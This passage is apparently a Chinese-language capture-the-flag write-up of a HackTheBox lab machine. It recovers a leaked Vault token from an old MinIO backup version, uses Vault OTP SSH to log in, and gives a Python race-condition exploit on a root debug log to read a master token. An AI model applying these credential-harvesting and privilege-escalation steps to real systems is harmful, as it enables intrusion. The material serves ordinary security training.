+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./mc <span class="built_in">ls</span> -r minio                                                                               </span><br><span class="line">[2023-11-08 13:35:28 HKT]  48KiB STANDARD askyy/Welcome.pdf</span><br><span class="line">[2023-11-10 05:37:25 HKT] 2.5KiB STANDARD askyy/home_backup.tar.gz</span><br><span class="line">[2023-11-08 13:35:36 HKT]  48KiB STANDARD btanner/Welcome.pdf</span><br><span class="line">[2023-11-08 13:35:56 HKT]  48KiB STANDARD emoneypenny/Welcome.pdf</span><br><span class="line">[2023-11-08 13:36:02 HKT]  48KiB STANDARD gmallory/Welcome.pdf</span><br><span class="line">[2023-11-08 08:08:05 HKT]  48KiB STANDARD guest/Welcome.pdf</span><br><span class="line">[2023-11-08 13:35:45 HKT]  48KiB STANDARD jbond/Welcome.pdf</span><br><span class="line">[2023-11-08 13:36:09 HKT]  48KiB STANDARD omansfield/Welcome.pdf</span><br><span class="line">[2023-11-08 13:35:51 HKT]  48KiB STANDARD rsilva/Welcome.pdf</span><br></pre></td></tr></table></figure>
+
+<p>看到有個備份，所以下載看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mc <span class="built_in">cp</span>  minio/askyy/home_backup.tar.gz .</span><br></pre></td></tr></table></figure>
+
+<p>結果什麽都沒有，對了桶有個和github commit差不多的功能，所以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ ./mc <span class="built_in">ls</span> --versions minio</span><br><span class="line">[2023-11-08 12:59:15 HKT]     0B askyy/</span><br><span class="line">[2023-11-08 13:35:28 HKT]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf</span><br><span class="line">[2023-11-10 05:37:25 HKT] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz</span><br><span class="line">[2023-11-10 05:37:09 HKT] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz</span><br><span class="line">[2023-11-10 05:36:30 HKT] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz</span><br><span class="line">[2023-11-08 12:58:56 HKT]     0B btanner/</span><br><span class="line">[2023-11-08 13:35:36 HKT]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf</span><br><span class="line">[2023-11-08 12:58:33 HKT]     0B emoneypenny/</span><br><span class="line">[2023-11-08 13:35:56 HKT]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf</span><br><span class="line">[2023-11-08 12:58:22 HKT]     0B gmallory/</span><br><span class="line">[2023-11-08 13:36:02 HKT]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf</span><br><span class="line">[2023-11-08 08:08:01 HKT]     0B guest/</span><br><span class="line">[2023-11-08 08:08:05 HKT]  48KiB STANDARD null v1 PUT guest/Welcome.pdf</span><br><span class="line">[2023-11-08 12:59:05 HKT]     0B jbond/</span><br><span class="line">[2023-11-08 13:35:45 HKT]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf</span><br><span class="line">[2023-11-08 12:58:10 HKT]     0B omansfield/</span><br><span class="line">[2023-11-08 13:36:09 HKT]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf</span><br><span class="line">[2023-11-08 12:58:45 HKT]     0B rsilva/</span><br><span class="line">[2023-11-08 13:35:51 HKT]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf</span><br></pre></td></tr></table></figure>
+
+<p>看到有三個備份，都下載下來看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mc <span class="built_in">cp</span> -vid 2b75346d-2a47-4203-ab09-3c9f878466b8  minio/askyy/home_backup.tar.gz .</span><br></pre></td></tr></table></figure>
+
+<p>看到第二個版本的備份的 <code>.bashrc</code>​ 有</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> VAULT_API_ADDR=<span class="string">&quot;http://prd23-vault-internal.skyfall.htb&quot;</span></span><br><span class="line"><span class="built_in">export</span> VAULT_TOKEN=<span class="string">&quot;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&quot;</span></span><br><span class="line"><span class="built_in">export</span> VAULT_ADDR=<span class="string">&quot;http://prd23-vault-internal.skyfall.htb&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x4-User-shell-on-the-box"><a href="#0x4-User-shell-on-the-box" class="headerlink" title="0x4 User shell on the box"></a>0x4 User shell on the box</h2><p>在這裏下載一個二進制版本</p>
+<p><a target="_blank" rel="noopener" href="https://developer.hashicorp.com/vault/install">https://developer.hashicorp.com/vault/install</a></p>
+<p>參考這篇得到：</p>
+<blockquote>
+<p><strong>vault read sys&#x2F;internal&#x2F;ui&#x2F;resultant-acl –format&#x3D;json|jq -r .data</strong></p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/70234255/how-to-identify-what-paths-can-be-accessed-with-what-capabilities-in-hashicorp-v">https://stackoverflow.com/questions/70234255/how-to-identify-what-paths-can-be-accessed-with-what-capabilities-in-hashicorp-v</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./vault <span class="built_in">read</span> sys/internal/ui/resultant-acl --format=json|jq -r .data</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;exact_paths&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;auth/token/lookup-self&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;read&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;auth/token/renew-self&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;auth/token/revoke-self&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;ssh/creds/dev_otp_key_role&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;create&quot;</span>,</span><br><span class="line">        <span class="string">&quot;read&quot;</span>,</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/capabilities-self&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/control-group/request&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/internal/ui/resultant-acl&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;read&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/leases/lookup&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/leases/renew&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/policy/developers&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;read&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/renew&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/tools/hash&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/wrapping/lookup&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/wrapping/unwrap&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/wrapping/wrap&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;glob_paths&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;cubbyhole/&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;create&quot;</span>,</span><br><span class="line">        <span class="string">&quot;delete&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span>,</span><br><span class="line">        <span class="string">&quot;read&quot;</span>,</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;ssh/&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sys/tools/hash/&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;update&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;root&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看到 role 是 <code>dev_otp_key_role</code>​，嘗試連接ssh，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">./vault ssh -role dev_otp_key_role -mode otp askyy@10.129.11.227</span><br><span class="line">Vault could not locate <span class="string">&quot;sshpass&quot;</span>. The OTP code <span class="keyword">for</span> the session is displayed</span><br><span class="line">below. Enter this code <span class="keyword">in</span> the SSH password prompt. If you install sshpass,</span><br><span class="line">Vault can automatically perform this step <span class="keyword">for</span> you.</span><br><span class="line">OTP <span class="keyword">for</span> the session is: eae35cff-8ccb-e314-9d08-dfec810380aa</span><br><span class="line">(askyy@10.129.11.227) Password: </span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that <span class="built_in">users</span> <span class="keyword">do</span> not <span class="built_in">log</span> into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the <span class="string">&#x27;unminimize&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Mon Feb  5 07:39:59 2024 from 10.10.16.2</span><br><span class="line">askyy@skyfall:~$ </span><br></pre></td></tr></table></figure>
+
+<p>密碼就是 <code>eae35cff-8ccb-e314-9d08-dfec810380aa</code>​</p>
+<h2 id="0xFF-Root-Patched"><a href="#0xFF-Root-Patched" class="headerlink" title="0xFF Root - Patched"></a>0xFF <del>Root - Patched</del></h2><p>在沒有打補丁的版本中，只需要 <code>touch debug.log</code>​ 就有權限看裏面的内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> askyy on skyfall:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User askyy may run the following commands on skyfall:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml [-vhd]*</span><br><span class="line">    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml</span><br></pre></td></tr></table></figure>
+
+<p>看到有個debug功能，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd</span><br><span class="line">[+] Reading: /etc/vault-unseal.yaml</span><br><span class="line">[-] Security Risk!</span><br><span class="line">[+] Found Vault node: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">[&gt;] Check interval: 5s</span><br><span class="line">[&gt;] Max checks: 5</span><br><span class="line">[&gt;] Checking seal status</span><br><span class="line">[+] Vault sealed: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">askyy@skyfall:~$ <span class="built_in">ls</span></span><br><span class="line">debug.log  user.txt</span><br><span class="line"></span><br><span class="line">askyy@skyfall:~$ <span class="built_in">cat</span> debug.log </span><br><span class="line"><span class="built_in">cat</span>: debug.log: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>可以直接刪掉 debug.log 因爲目錄下有用戶權限，之後創建一個 debug.log ，這樣就有讀取的權限了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~$ <span class="built_in">rm</span> debug.log </span><br><span class="line"><span class="built_in">rm</span>: remove write-protected regular file <span class="string">&#x27;debug.log&#x27;</span>? y</span><br><span class="line"></span><br><span class="line">askyy@skyfall:~$ <span class="built_in">touch</span> debug.log</span><br><span class="line"></span><br><span class="line">askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd</span><br><span class="line">[+] Reading: /etc/vault-unseal.yaml</span><br><span class="line">[-] Security Risk!</span><br><span class="line">[+] Found Vault node: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">[&gt;] Check interval: 5s</span><br><span class="line">[&gt;] Max checks: 5</span><br><span class="line">[&gt;] Checking seal status</span><br><span class="line">[+] Vault sealed: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">askyy@skyfall:~$ <span class="built_in">cat</span> debug.log </span><br><span class="line">2024/02/05 08:17:17 Initializing logger...</span><br><span class="line">2024/02/05 08:17:17 Reading: /etc/vault-unseal.yaml</span><br><span class="line">2024/02/05 08:17:17 Security Risk!</span><br><span class="line">2024/02/05 08:17:17 Master token found <span class="keyword">in</span> config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG</span><br><span class="line">2024/02/05 08:17:17 Found Vault node: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">2024/02/05 08:17:17 Check interval: 5s</span><br><span class="line">2024/02/05 08:17:17 Max checks: 5</span><br><span class="line">2024/02/05 08:17:17 Establishing connection to Vault...</span><br><span class="line">2024/02/05 08:17:17 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">2024/02/05 08:17:17 Checking seal status</span><br><span class="line">2024/02/05 08:17:17 Vault sealed: <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x5-Root-Get-the-Root-token-again"><a href="#0x5-Root-Get-the-Root-token-again" class="headerlink" title="0x5 Root - Get the Root token again"></a>0x5 Root - Get the Root token again</h2><p>補丁后的版本，<code>sudo -l</code>​ 沒有什麽變化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> askyy on skyfall:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User askyy may run the following commands on skyfall:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$</span><br><span class="line">    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml</span><br></pre></td></tr></table></figure>
+
+<p>由於不知道做了什麽，嘗試使用 pspy64 來看看這個程序做了什麽：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240424054520-t6uxr5u.png" alt="image">​</p>
+<p>可以看到他會刪除原本的文件，然後新建文件之後寫入新的内容。</p>
+<p>但是如果在刪除文件和創建文件的空窗期去新建一個文件的時候，用戶就有權限讀寫文件（相當於touch一樣）</p>
+<p>爲了測試這個空窗期有多長，下面寫了個脚本去檢測：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (os.path.exists(<span class="string">&quot;/home/askyy/debug.log&quot;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>爲什麽不用bash的white呢？因爲bash會非常非常的慢，所以還是選擇了python。</p>
+<p>運行了之後你可以看到空窗期非常的長，這就有機會在這個空窗期之内使用普通用戶創建文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240424054936-nv7tkfq.png" alt="image">​</p>
+<p> 所以exp：</p>
+<ul>
+<li>首先創建一個空的 <code>debug.log</code>​</li>
+<li>然後實時檢測<code>debug.log</code>​，儅<code>debug.log</code>​被刪除了之後，馬上新建一個</li>
+<li>然後開啓一個綫程兩秒鐘之後運行，這樣就不需要多開一個shell</li>
+</ul>
+<p>最後如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,threading,time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] power by @manesec :P&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; -  if show &quot;Permission denied&quot; just run again :S&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; -  exp it can let you to &quot;cat debug.log&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># run process for 2 seconds ...</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">thr_run</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Thread created, 2 seconds to run ...&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    os.system(<span class="string">&quot;sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd&quot;</span>)</span><br><span class="line"></span><br><span class="line">threading.Thread(target=thr_run).start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># touch debug.log</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (os.path.exists(<span class="string">&quot;/home/askyy/debug.log&quot;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Create debug.log, just help for detection&quot;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;/home/askyy/debug.log&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;** mane testing **\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (os.path.exists(<span class="string">&quot;/home/askyy/debug.log&quot;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Detected !!!&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.remove(<span class="string">&quot;/home/askyy/debug.log&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;/home/askyy/debug.log&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;** mane testing **\n&quot;</span>)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Success to write files!!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;cat /home/askyy/debug.log&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然後就可以愉快的 <code>cat debug.log</code>​，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240424062131-d5mf765.png" alt="image">​</p>
+<h2 id="0x6-得到了token就可以鏈接了"><a href="#0x6-得到了token就可以鏈接了" class="headerlink" title="0x6 得到了token就可以鏈接了"></a>0x6 得到了token就可以鏈接了</h2><p>得到root的 token <code>hvs.I0ewVsmaKU1SwVZAKR3T0mmG</code>​，</p>
+<p>然後嘗試連接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> VAULT_ADDR=http://prd23-vault-internal.skyfall.htb</span><br><span class="line"><span class="built_in">export</span> VAULT_TOKEN=hvs.I0ewVsmaKU1SwVZAKR3T0mmG </span><br><span class="line"><span class="built_in">export</span> REMOTE_HOST_IP=10.129.11.227  </span><br><span class="line">./vault ssh -role dev_otp_key_role -mode otp root@10.129.11.227</span><br><span class="line"></span><br><span class="line">failed to generate credential: failed to get credentials: Error making API request.</span><br><span class="line"></span><br><span class="line">URL: PUT http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role</span><br><span class="line">Code: 400. Errors:</span><br><span class="line"></span><br><span class="line">* Username is not present is allowed <span class="built_in">users</span> list</span><br></pre></td></tr></table></figure>
+
+<p>看起來是因爲role的關係，刪掉role看看，</p>
